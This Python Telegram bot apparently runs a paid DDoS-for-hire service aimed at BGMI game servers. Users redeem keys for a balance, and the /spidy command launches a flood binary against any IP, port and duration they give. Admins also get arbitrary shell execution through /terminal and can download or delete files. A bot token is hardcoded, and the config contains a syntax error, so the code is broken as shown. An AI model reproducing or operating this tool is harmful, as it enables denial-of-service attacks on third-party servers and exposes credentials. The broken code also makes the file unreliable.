
import asyncio
import json
import os
import random
import string
import time
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import sqlite3

# --------------------[ CONFIGURATION ]----------------------
BOT_TOKEN = "7577845413:AAE1CZcV4wQrxSjb9xUIS8c0HsGHr8glwtM"  # Replace with your actual bot token
ADMIN_IDS = [6710024903]  # Replace with your Telegram user ID
START_TIME = time.time()

# --------------------[ FILE PATHS ]----------------------
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
CONFIG_FILE = "config.json"
BINARY_PATH = "./spidy"

# --------------------[ Attack Config ]----------------------
# Load configuration from CONFIG_FILE
def load_config():
    default_config = {
        "allowed_port_range": [10003, 30000],
        "allowed_ip_prefixes": ["20.", "4.", "52."],
        "blocked_ports": [10000, 10001, 10002, 17500, 20000, 20001, 20002, 443],
        "default_threads": ,
        "default_max_time": 240,
        "data_per_second": 0.5  # MB per second
    }
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        # Update with default values if some keys are missing
        config = {**default_config, **config}
    except FileNotFoundError:
        config = default_config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    return config

config = load_config()
ALLOWED_PORT_RANGE = range(config["allowed_port_range"][0], config["allowed_port_range"][1] + 1)
ALLOWED_IP_PREFIXES = tuple(config["allowed_ip_prefixes"])
BLOCKED_PORTS = set(config["blocked_ports"])
DEFAULT_THREADS = config["default_threads"]
DEFAULT_MAX_TIME = config["default_max_time"]
DATA_PER_SECOND = config["data_per_second"]

app = Client("spidy_bot", bot_token=BOT_TOKEN)

# --------------------[ UTILS ]----------------------
def load_json(file):
    if not os.path.exists(file):
        with open(file, 'w') as f:
            json.dump({}, f)
    with open(file) as f:
        return json.load(f)

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def get_user(user_id):
    users = load_json(USERS_FILE)
    return users.get(str(user_id), {"balance": 0, "role": "user", "username": None})

def update_user(user_id, data):
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {"balance": 0, "role": "user", "username": None}
    users[user_id_str] = {**users[user_id_str], **data}
    save_json(USERS_FILE, users)

def is_admin(user_id):
    return user_id in ADMIN_IDS

async def execute_db_operation(operation, *args):
    max_retries = 5
    retry_delay = 1  # seconds

    for attempt in range(max_retries):
        try:
            # Execute the database operation
            operation(*args)
            return  # Operation successful, exit the loop
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e):
                print(f"Database is locked. Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
            else:
                # Re-raise the exception for other errors
                raise
    raise Exception("Max retries reached. Database operation failed.")

def log_user(message):
    user = message.from_user
    user_id = str(user.id)
    user_data = get_user(user.id)
    update_user(user.id, {"username": user.username})
    
    users = load_json(USERS_FILE)
    if user_id not in users:
        users[user_id] = {"balance": 0, "role": "user", "username": user.username}
        save_json(USERS_FILE, users)

def generate_key(amount, custom=None):
    prefix = f"spidy{amount}"
    random_part = custom if custom else ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    key = prefix + random_part
    keys = load_json(KEYS_FILE)
    keys[key] = amount
    save_json(KEYS_FILE, keys)
    return key

# --------------------[ COMMAND HANDLERS ]----------------------
@app.on_message(filters.command("start"))
async def start_handler(_, message):
    log_user(message)
    await message.reply("""
HELLO BABY NOW ITS TIME TO KUCH BGMI /spidy
Use /help to explore all features and commands! 
    """)

@app.on_message(filters.command("help"))
async def help_handler(_, message):
    await message.reply("""
**COMMANDS:**
/spidy ip port time – Start Attack 💥
/balance – Check Balance 💰
/genkey {amount} {custom (optional)} – Generate Key (Admin) 🔑
/redeem {key} – Redeem Key 🎁
/add_admin user_id – Add Admin (Admin) 👑
/remove_admin user_id – Remove Admin (Admin) 🚫
/allusers – Show All Users 👥
/myinfo – Show Your Info 📝
/uptime – Bot Uptime ⏳
/ping – Bot Ping 🏓
/broadcast message – Send Broadcast (Admin) 📣
/threads {amount} – Set Threads (Admin) ⚙️
/admincmd – Admin Commands 🛠️
/terminal {command} – Terminal Access (Admin) 💻
/admin – Show Admin 🕴️
/remove user_id - Remove User (Admin) ❌
/userinfo user_id - Get User Info (Admin) ℹ️
/delete filename - Delete File (Admin) 🗑️
/download filename - Download File (Admin) 📥
/add userid - Add Access for User (Admin) ➕
    """)

@app.on_message(filters.command("spidy"))
async def spidy_handler(_, message: Message):
    log_user(message)
    args = message.text.split()
    if len(args) != 4:
        return await message.reply("Usage:- {ip} {port} {duration}")

    ip, port, seconds = args[1], int(args[2]), int(args[3])
    user_id = message.from_user.id

    if not ip.startswith(ALLOWED_IP_PREFIXES):
        return await message.reply("Blocked IP range 🚫.")
    if port in BLOCKED_PORTS or port not in ALLOWED_PORT_RANGE:
        return await message.reply("Port is not allowed 🚫.")
    
    threads = config.get("default_threads", DEFAULT_THREADS)
    max_time = config.get("default_max_time", DEFAULT_MAX_TIME)

    if seconds > max_time:
        return await message.reply(f"Max attack time is {max_time} seconds ⏱️.")

    if not is_admin(user_id):
        user_data = get_user(user_id)
        if user_data.get("balance", 0) < 10:
            return await message.reply("Insufficient balance 💸.")

    await message.reply(f"**Attack Started** 💥\nIP: {ip}\nPort: {port}\nTime: {seconds}s\nMethod by @{message.from_user.username or 'Unknown'}")

    process = await asyncio.create_subprocess_exec(BINARY_PATH, ip, str(port), str(seconds), str(threads))
    await asyncio.sleep(seconds)

    data_used = seconds * DATA_PER_SECOND
    if not is_admin(user_id):
        user_data = get_user(user_id)
        update_user(user_id, {"balance": user_data["balance"] - 10})

    await message.reply(f"**Attack Finished** ✅\nIP: {ip}\nPort: {port}\nTime: {seconds}s\nData Used: {data_used:.2f}MB\nMethod by @{message.from_user.username or 'Unknown'}")

@app.on_message(filters.command("balance"))
async def balance_handler(_, message):
    user_id = message.from_user.id
    if is_admin(user_id):
        await message.reply("Admins have unlimited balance! ♾️")
    else:
        user = get_user(message.from_user.id)
        await message.reply(f"Your balance: ₹{user.get('balance', 0)} 💰")

@app.on_message(filters.command("genkey"))
async def genkey_handler(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.reply("Only admin can do this! You have not permission")
        return

    args = message.text.split()
    if len(args) < 2:
        return await message.reply("Usage: /genkey amount [custom_key]")
    amount = args[1]
    custom = args[2] if len(args) > 2 else None
    key = generate_key(amount, custom)
    await message.reply(f"Key Generated: `{key}` 🔑")

@app.on_message(filters.command("redeem"))
async def redeem_handler(_, message):
    user_id = message.from_user.id
    if is_admin(user_id):
        await message.reply("Admins do not need to redeem keys! ♾️")
        return

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /redeem key")
    key = args[1]
    keys = load_json(KEYS_FILE)
    if key in keys:
        amount = int(keys[key])
        user = get_user(message.from_user.id)
        update_user(message.from_user.id, {"balance": user.get("balance", 0) + amount})
        del keys[key]
        save_json(KEYS_FILE, keys)
        await message.reply(f"Key Redeemed! ₹{amount} added 🎁.")
    else:
        await message.reply("Invalid Key ❌.")

@app.on_message(filters.command("add_admin"))
async def add_admin(_, message):
    if not is_admin(message.from_user.id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /add_admin user_id")

    try:
        user_id = int(args[1])
    except ValueError:
        return await message.reply("Invalid user ID.")

    if user_id in ADMIN_IDS:
        return await message.reply(f"User {user_id} is already an admin!")

    ADMIN_IDS.append(user_id)
    await message.reply(f"User {user_id} is now an admin 👑.")

@app.on_message(filters.command("remove_admin"))
async def remove_admin(_, message):
    if not is_admin(message.from_user.id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /remove_admin user_id")

    try:
        user_id = int(args[1])
    except ValueError:
        return await message.reply("Invalid user ID.")

    if user_id not in ADMIN_IDS:
        return await message.reply(f"User {user_id} is not an admin!")

    ADMIN_IDS.remove(user_id)
    await message.reply(f"Admin {user_id} removed 🚫.")

@app.on_message(filters.command("allusers"))
async def all_users(_, message):
    if not is_admin(message.from_user.id):
        return await message.reply("Only admin can do this! You have not permission")

    users = load_json(USERS_FILE)
    reply = "**Users:** 👥\n"
    for uid, user_data in users.items():
        reply += f"ID: {uid} - Username: @{user_data.get('username', 'Unknown')} - Balance: {'Unlimited' if is_admin(int(uid)) else f'₹{user_data.get('balance', 0)}'} - Role: {user_data.get('role', 'user')}\n"
    await message.reply(reply)

@app.on_message(filters.command("myinfo"))
async def my_info(_, message):
    u = message.from_user
    user = get_user(u.id)
    await message.reply(f"Username: @{u.username}\nID: {u.id}\nName: {u.first_name} {u.last_name or ''}\nRole: {user['role']}\nBalance: {'Unlimited' if is_admin(u.id) else f'₹{user['balance']}'} 📝")

@app.on_message(filters.command("uptime"))
async def uptime(_, message):
    up = int(time.time() - START_TIME)
    await message.reply(f"Uptime: {up} seconds ⏳")

@app.on_message(filters.command("ping"))
async def ping(_, message):
    start = time.time()
    m = await message.reply("Pinging... 🏓")
    end = time.time()
    await m.edit(f"Pong! {int((end - start) * 1000)} ms")

@app.on_message(filters.command("broadcast"))
async def broadcast(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split(" ", 1)
    if len(args) < 2:
        return await message.reply("Usage: /broadcast {message}")

    msg = args[1]
    users = load_json(USERS_FILE)
    for uid in users:
        try:
            await app.send_message(int(uid), msg)
        except Exception as e:
            print(f"Error sending message to user {uid}: {e}")
    await message.reply("Broadcast complete 📣.")

@app.on_message(filters.command("threads"))
async def set_threads(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /threads {amount}")

    try:
        t = int(args[1])
    except ValueError:
        return await message.reply("Invalid thread amount. Please provide a number.")

    config = load_config()
    config["default_threads"] = t
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    await message.reply(f"Threads change done ✅💯")

@app.on_message(filters.command("admincmd"))
async def admincmd(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")
    await message.reply("You are authorized for admin commands 🛠️.")

@app.on_message(filters.command("terminal"))
async def terminal(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")
    cmd = message.text.split(" ", 1)[1]
    try:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        output = stdout.decode() + "\n" + stderr.decode()
        await message.reply(f"Executed: {cmd}\n\nOutput:\n{output}")
    except Exception as e:
        await message.reply(f"Error executing command: {e}")

@app.on_message(filters.command("admin"))
async def admin(_, message):
    ADMIN_USERNAME = "NINJAGAMEROP"
    await message.reply(f"Bot Admin: @{ADMIN_USERNAME} 🕴️")

@app.on_message(filters.command("remove"))
async def remove_user(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /remove {user_id}")

    target_user_id = args[1]
    users = load_json(USERS_FILE)
    if target_user_id in users:
        del users[target_user_id]
        save_json(USERS_FILE, users)
        await message.reply(f"User {target_user_id} removed ❌.")
    else:
        await message.reply(f"User {target_user_id} not found ❌.")

@app.on_message(filters.command("userinfo"))
async def user_info(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /userinfo {user_id}")

    target_user_id = args[1]
    user = get_user(target_user_id)
    if user:
        await message.reply(f"**User Info:**\nID: {target_user_id}\nUsername: @{user.get('username', 'N/A')}\nRole: {user['role']}\nBalance: {'Unlimited' if is_admin(int(target_user_id)) else f'₹{user['balance']}'}")
    else:
        await message.reply(f"User {target_user_id} not found ❌.")

@app.on_message(filters.command("delete"))
async def delete_file(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /delete filename")

    file_name = args[1]
    try:
        os.remove(file_name)
        await message.reply(f"File `{file_name}` deleted successfully 🗑️.")
    except Exception as e:
        await message.reply(f"Error deleting file: {e}")

@app.on_message(filters.command("download"))
async def download_file(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /download filename")

    file_name = args[1]
    try:
        await app.send_document(message.chat.id, file_name)
        await message.reply(f"File `{file_name}` downloaded successfully 📥.")
    except Exception as e:
        await message.reply("File not found ❌")

@app.on_message(filters.command("add"))
async def add_access(_, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("Only admin can do this! You have not permission")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /add {user_id}")

    target_user_id = args[1]
    update_user(target_user_id, {"role": "admin"})
    await message.reply(f"User {target_user_id} is now an admin 👑.")

# Run the bot
app.run()
